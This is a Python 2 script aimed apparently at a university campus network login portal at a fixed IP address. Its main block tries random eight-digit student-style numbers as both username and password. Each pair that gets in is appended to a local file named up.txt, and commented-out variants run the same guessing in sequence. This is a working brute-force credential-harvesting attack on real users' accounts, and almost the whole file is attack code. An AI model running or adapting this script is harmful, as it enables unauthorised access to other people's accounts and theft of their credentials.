#-*- coding:utf-8 -*-
import urllib
import urllib2
import cookielib
import re
import socket
import random
#import LoginEncode
#from lxml import html
from bs4 import BeautifulSoup


class XiaoyuanLogin:
	def __init__(self,username,pwd,enableProxy=False):
		#print "Start to Login Tust..."

		self.username = username
		self.password = pwd
		self.enableProxy = enableProxy

		self.serverUrl= "http://59.67.0.220/0.htm"
		self.postHeader={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
							'Referer':'http://59.67.0.220/0.htm'}

	def Login(self):
		#set cookies
		self.EnableCookie(self.enableProxy)
		#set postdata
		postData = self.PostEncode(self.username,self.password)
		#print postData

		request = urllib2.Request(self.serverUrl,postData,self.postHeader)
		#print "Post request..."

		try:
			result = urllib2.urlopen(request,timeout=10).read()
			soup = BeautifulSoup(result)
			htitle = soup.find('title')
			htitle =  str(htitle)
			#print "[+]htitle:"+htitle 
			pattern = re.compile('<title>(.*)</title>')
			match = pattern.match(htitle)
			title = match.group(1)
			print "[+]title:"+title
			if title == "信息返回窗":
				print "Login Failed"
				return False
			elif title == "登陆成功窗":
				print "Login success!"
				return True
			else:
				print "Unknow reason,Login failed"
				return True
		except urllib2.HTTPError,e:
			print e.code
			print e.reason
			print "Login error"
			return False


	def EnableCookie(self, enableProxy):
		cookie = cookielib.LWPCookieJar()
		cookie_support = urllib2.HTTPCookieProcessor(cookie)

		if enableProxy:
			proxy_support = urllib2.ProxyHandler({'http':'http://xxx.pac'})#use proxy server
			opener = urllib2.build_opener(proxy_support,cookie_support,urllib2.HTTPHandler)
			print "Proxy enabled"
		else:
			opener=urllib2.build_opener(cookie_support,urllib2.HTTPHandler)

		urllib2.install_opener(opener) # construct opener respondent to cookie

	def PostEncode(self,username,password):
		postPara={
			'DDDDD':username,
			'upass':password,
			'0MKKey':'cc(0)'
		}
		postData = urllib.urlencode(postPara)
		return postData


'''
if __name__=='__main__':
	for i in range(90000000,99999999):
		username = str(i)
		password = username
		mylogin = XiaoyuanLogin(username,password)
		if mylogin.Login() == True:
			#print "[+]Login success!"
			print "[+]username:",username,"password:",password
			fp = open('up.txt','a')
			fp.write(username+'\t'+password+'\n')
			fp.close()
		else:
			print "[+]username:",username,"password:",password
'''

'''
if __name__=='__main__':
		mylogin = XiaoyuanLogin('95850276','95850276')
		if mylogin.Login() == True:
			#print "[+]Login success!"
			print "[+]username:",username,"password:",password
			fp = open('up.txt','a')
			fp.write(username+'\t'+password+'\n')
			fp.close()
'''

if __name__=='__main__':
	for j in range(90000000,99999999):
		rand = random.randint(90000000,99999999)
		username = str(rand)
		password = username
		mylogin = XiaoyuanLogin(username,password)
		if mylogin.Login() == True:
			#print "[+]Login success!"
			print "[+]username:",username,"password:",password
			fp = open('up.txt','a')
			fp.write(username+'\t'+password+'\n')
			fp.close()
			break
		else:
			print "[+]username:",username,"password:",password